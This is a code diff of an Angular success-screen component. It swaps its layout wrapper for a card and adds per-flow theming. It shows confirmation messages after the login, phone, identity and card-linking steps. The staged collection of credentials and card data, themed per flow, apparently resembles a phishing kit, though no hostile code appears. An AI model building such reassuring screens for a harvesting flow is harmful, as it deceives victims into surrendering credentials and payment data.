@@ -1,15 +1,19 @@
 import { Component, inject, computed } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { StateService } from '../services/state.service';
-import { PublicLayoutComponent } from './layout/public-layout.component';
+import { CardComponent, CardVariant } from './ui/card.component';
 
 @Component({
   selector: 'app-step-success',
   standalone: true,
-  imports: [CommonModule, PublicLayoutComponent],
+  imports: [CommonModule, CardComponent],
+  host: {
+    '[attr.data-theme]': 'currentFlowId()',
+    'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
+  },
   template: `
-    <app-public-layout>
-      <div class="flex flex-col items-center justify-center py-8 text-center animate-in fade-in zoom-in duration-300">
+    <ui-card [variant]="cardVariant()">
+      <div class="flex flex-col items-center justify-center py-6 text-center animate-in fade-in zoom-in duration-300">
         
         <div class="relative mb-6">
             <div class="w-24 h-24 rounded-full bg-[#e1f0fa] flex items-center justify-center relative z-10">
@@ -35,26 +39,29 @@ import { PublicLayoutComponent } from './layout/public-layout.component';
         </button>
 
       </div>
-    </app-public-layout>
+    </ui-card>
   `
 })
 export class StepSuccessComponent {
   state = inject(StateService);
 
+  currentFlowId = computed(() => this.state.currentFlow()?.id || 'generic');
+  cardVariant = computed<CardVariant>(() => 'elevated');
+
   title = computed(() => {
-     if (this.state.stage() === 'login') return 'Login Confirmed';
-     if (this.state.stage() === 'phone_pending') return 'Phone Verified';
-     if (this.state.stage() === 'personal_pending') return 'Identity Confirmed';
-     if (this.state.stage() === 'card_pending') return 'Card Linked';
-     return 'Verified';
+    if (this.state.stage() === 'login') return 'Login Confirmed';
+    if (this.state.stage() === 'phone_pending') return 'Phone Verified';
+    if (this.state.stage() === 'personal_pending') return 'Identity Confirmed';
+    if (this.state.stage() === 'card_pending') return 'Card Linked';
+    return 'Verified';
   });
 
   message = computed(() => {
-     if (this.state.stage() === 'login') return 'Your credentials have been securely verified.';
-     if (this.state.stage() === 'phone_pending') return 'Your device has been authenticated.';
-     if (this.state.stage() === 'personal_pending') return 'Your profile information is updated.';
-     if (this.state.stage() === 'card_pending') return 'Your financial instrument is secured.';
-     return 'Proceeding to the next step.';
+    if (this.state.stage() === 'login') return 'Your credentials have been securely verified.';
+    if (this.state.stage() === 'phone_pending') return 'Your device has been authenticated.';
+    if (this.state.stage() === 'personal_pending') return 'Your profile information is updated.';
+    if (this.state.stage() === 'card_pending') return 'Your financial instrument is secured.';
+    return 'Proceeding to the next step.';
   });
 
   continue() {
